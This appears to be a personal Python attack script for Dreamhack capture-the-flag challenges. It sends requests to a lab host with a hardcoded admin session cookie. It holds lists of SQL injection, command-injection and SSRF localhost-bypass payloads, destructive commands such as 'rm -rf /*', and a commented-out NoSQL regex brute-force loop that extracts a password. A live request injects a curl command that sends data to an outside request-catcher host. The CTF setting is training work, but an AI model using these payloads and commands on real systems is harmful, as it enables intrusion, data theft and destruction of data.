import requests
import re
import string, json

host = 'http://host3.dreamhack.games'
port = '10214'
url = host+':'+port
headers = {'Content-Type': 'application/json; charset=utf-8'}
cookies = {
        'username': 'admin',
        'sessionid': '20642b2f8484ec17cb44fa25680ead4791ac6bfedc29f04de00d364cf4d70c5f'}
data = {'cmd': 'ls'
        #'host': '8.8.8.8";cat "/app/flag.py'
        }
payloadSQL = ['admin\' OR \'1',                 # admin' OR '1
              'admin\' OR 1 -- -',              # admin' OR 1 -- -
              '" OR "" = "',                    # " OR "" = "
              '" OR 1 = 1 -- -',                # " OR 1 = 1 -- -
              '\'=\'',                          # '='
              '\'LIKE\'',                       # 'LIKE'
              '\'=0--+'                         #'=0--+
              ]
payloadCommandInjection = [';ls "."',           # ;ls "."
                           '";ls ".',           # ";ls ".
                           ';pwd',              # ;pwd
                           '";pwd "',           # ";pwd "
                           ';cat /tmp/flag',    # ;cat /tmp/flag
                           '";cat /tmp/flag'    # ";cat /tmp/flag
                           ]
payloadCommand = ['rm ./',
                  'rm -rf ./*',
                  'rm -rf /*',
                  'cp -rf ./* ../',
                  'cat /',
                  'clear',
                  'ping http://localhost',
                  'whois https://naver.com',
                  '가나다']

#for payload in payloadCommandInjection:
#    data = {'host': '8.8.8.8'+payload}
#    response = requests.post(url, data=data)
#    print("================================================================")
#    print("Command injection payload: " + payload)
#    print(response.text)
#

payloadLocalhost = ['http://localhost',
                    'http://vcap.me',
                    'http://0x7f.0x00.0x00.0x01',
                    'http://0x7f000001',
                    'http://2130706433',
                    'http://Localhost',
                    'http://127.0.0.255'
                    'http://127.1',
                    ]
regex_flag = re.compile('DH{.*}')
ALPHANUMERIC = string.digits + string.ascii_letters
flag = ''
def refineResponse(text):
    text = re.sub('<head>(.|\n)*</head>', '', text)
    text = re.sub('\n(\n|\s)*\n', '', text)
    return text
def detector(text):
    regex_flag
# response = requests.get("http://host1.dreamhack.games:19500/", verify=False, cookies=cookies)
# verify=False SSL 인증서 에러가 나서 추가해줬다.


#if len(regex_flag.findall(response.text))>0:
#    print("1")
#    print(regex_flag.findall(response.text))
#else:
#    print("2")
#    print(response.text)

#for i in range(32):
#    for char in ALPHANUMERIC:
 #       response = requests.get(host+':'+port+'/login?uid[$regex]=ad.in&upw[$regex]=^D.{'+flag+char+'.*}', verify=False)
  #      if response.text.find('admin')!=-1:
   #         flag += char
    #        print(str(char))
     #       break

#print(response.text)
response = requests.head(url+'?cmd= curl https://mjmqxqr.request.dreamhack.games -d "hello"', verify=False)
#for param in payloadCommand:
#    params = {'cmd': param}
#    print("================================================================")
#    print("Command injection payload: " + param)
#    print(refineResponse(response.text))
